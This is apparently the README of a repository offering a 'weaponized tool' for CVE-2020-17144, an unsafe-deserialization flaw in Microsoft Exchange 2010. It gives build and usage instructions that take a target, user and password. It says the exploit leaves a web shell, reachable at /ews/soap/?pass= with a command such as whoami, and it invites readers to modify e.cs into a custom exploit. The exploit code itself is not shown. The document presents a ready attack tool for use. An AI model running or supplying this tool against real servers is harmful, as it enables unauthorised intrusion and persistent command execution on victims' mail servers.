## weaponized tool for CVE-2020-17144(Microsoft Exchange 2010 MRM.AutoTag.Model unsafe deserialize vulnerability)

### build

install .net framework 3.5 first, then `make`. 

### usage
	CVE-2020-17144 <target> <user> <pass>

After exploit, access http://[target]/ews/soap/?pass=whoami to get command execution.

![](https://raw.githubusercontent.com/zcgonvh/CVE-2020-17144/master/exp.jpg)

And you can also modify e.cs as a customize exp.

for more information, read [my-blog-post](http://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html)(in chinese).